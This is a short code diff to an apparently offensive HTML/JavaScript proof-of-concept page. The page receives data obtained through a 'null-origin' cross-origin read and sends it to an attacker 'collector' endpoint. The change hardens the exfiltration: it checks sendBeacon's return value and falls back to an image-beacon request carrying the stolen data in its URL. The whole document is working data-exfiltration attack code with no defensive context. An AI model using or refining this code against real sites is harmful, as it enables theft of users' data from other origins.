@@ -27,8 +27,10 @@
   window.addEventListener("message", function (e) {
     document.getElementById("out").textContent =
       "null-origin read " + (("" + e.data).length) + " bytes; sent to collector.";
-    try { navigator.sendBeacon(COLLECT, e.data); }
-    catch (x) { new Image().src = COLLECT + "?d=" + encodeURIComponent(e.data); }
+    // sendBeacon returns FALSE on failure/oversize (it does NOT throw) — check the return, else fall back.
+    var ok = false;
+    try { ok = navigator.sendBeacon(COLLECT, e.data); } catch (x) { ok = false; }
+    if (!ok) { new Image().src = COLLECT + "?d=" + encodeURIComponent(e.data); }
   });
 </script>
 </body></html>
